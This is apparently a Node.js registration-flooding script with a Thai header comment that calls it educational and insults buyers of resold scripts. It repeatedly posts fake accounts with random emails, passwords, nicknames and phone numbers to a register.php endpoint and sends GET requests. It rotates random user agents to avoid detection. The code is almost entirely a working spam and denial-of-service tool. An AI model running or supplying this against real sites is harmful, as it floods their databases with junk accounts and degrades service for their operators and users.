/*
---------------------------------------------------------
ทำเพือการศึกษา โดย TinnerKung
แจกได้จำหน่ายพ่องตาย
ของมันฟรีเสือกหาพ่อค้าดูด Script เอาไปโมให้เสียตัง
ลูกค้าแม่งก็ควายชิปหาย

- TinnerKung
- Facebook https://www.facebook.com/sycertinnerkung
- GitHub https://github.com/TinnerKung
- Website https://sycerteam.tk

---------------------------------------------------------
*/
function runflood() {

var req = require('request');
const https = require('https')
var randomEmail = require('random-email');
var randomstring = require("randomstring");
var Choices = require('prompt-choices');
var colors = require('colors/safe');
var random_useragent = require('random-useragent');

const urlget = 'localhost'; // URL FOR GET
const urlfileget = '/system/data/register.php'; // URLFILE FOR GET
const urlpost = 'https://localhost/system/data/register.php'; // URL FOR POST
const portattack = '443'; // PORT FOR GET & POST
const times = '1000';
 
const phones = Math.floor(Math.random() * 9000000000) + 1000000000;
const passwords = Math.floor(Math.random() * 900000000000) + 100000000000;
const emails = randomEmail({ domain: 'sycerteam.tk' }); 
const forms = { email: emails, password: passwords, repassword: passwords, nickname: randomstring.generate(7) , phone: phones };

req.post({
   url: urlpost,
   form: forms,
   port: portattack,
   headers: { 
      'User-Agent': random_useragent.getRandom(),
      'Content-Type' : 'application/x-www-form-urlencoded' 
   },
   method: 'POST'
  },

  function (e, r, body, headers) {
      console.log(colors.green('ยิงที่ลิงค์ ',urlpost)),
      console.log(colors.green('ยิง PORT ',portattack)),
      console.log(colors.green('ผลตอบกลับ ' , body));
      console.log(forms);
      console.log(colors.green('ยิง proxy เครื่อง',random_useragent.getRandom()));
      console.log(colors.green(forms));
      
  },);

  const options = {
   hostname: urlget,
   port: portattack,
   path: urlfileget,
   method: 'GET'
 }
 
 var req = https.request(options, (res) => {
   console.log(colors.green(`statusCode: ${res.statusCode}`))
 })
 
 req.end()

};

 setInterval(runflood, times);
